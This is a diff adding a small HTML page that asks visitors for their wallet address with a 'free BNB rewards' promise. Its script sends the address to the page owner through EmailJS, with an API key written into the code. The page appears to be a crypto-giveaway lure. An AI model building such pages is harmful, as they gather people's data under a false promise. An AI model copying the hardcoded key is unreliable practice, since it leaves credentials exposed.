@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f4f8; /* لون خلفية ناعم */
+        }
+
+        .container {
+            text-align: center;
+            background-color: #ffffff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1); /* تأثير الظل */
+            max-width: 450px;
+            width: 100%;
+            transition: transform 0.3s ease;
+        }
+
+        .container:hover {
+            transform: scale(1.05); /* تكبير العنصر عند المرور عليه */
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #333333;
+            margin-bottom: 20px;
+            font-weight: 600;
+            text-transform: uppercase; /* جعل العنوان بحروف كبيرة */
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            border: 2px solid #007bff; /* حدود زرقاء */
+            border-radius: 8px;
+            font-size: 16px;
+            color: #333333;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-field:focus {
+            border-color: #0056b3; /* تغير الحدود عند التركيز */
+        }
+
+        .button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 8px;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #0056b3;
+        }
+
+        .button:active {
+            background-color: #003f7f;
+        }
+
+        p {
+            font-size: 14px;
+            color: #888888;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Enter Your Wallet Address</h1>
+    <input type="text" id="walletAddress" class="input-field" placeholder="Enter your wallet address here">
+    <button class="button" onclick="submitAddress()">Submit Address</button>
+    <p>Get free BNB rewards!</p>
+</div>
+
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+    // تهيئة EmailJS باستخدام API Key الخاص بك
+    (function() {
+        emailjs.init("8X1baIi13LJHIxvSWhxVv"); // استخدم هنا Private API Key الخاص بك
+    })();
+
+    function submitAddress() {
+        const address = document.getElementById('walletAddress').value;
+
+        if (address) {
+            // إعداد البيانات للإرسال عبر EmailJS
+            emailjs.send("service_2cvbx2m", "YOUR_TEMPLATE_ID", {
+                wallet_address: address
+            }).then(function(response) {
+                alert("Address submitted successfully!");
+            }, function(error) {
+                alert("Failed to send address, please try again.");
+            });
+        } else {
+            alert('Please enter your wallet address');
+        }
+    }
+</script>
+
+
+</body></html>
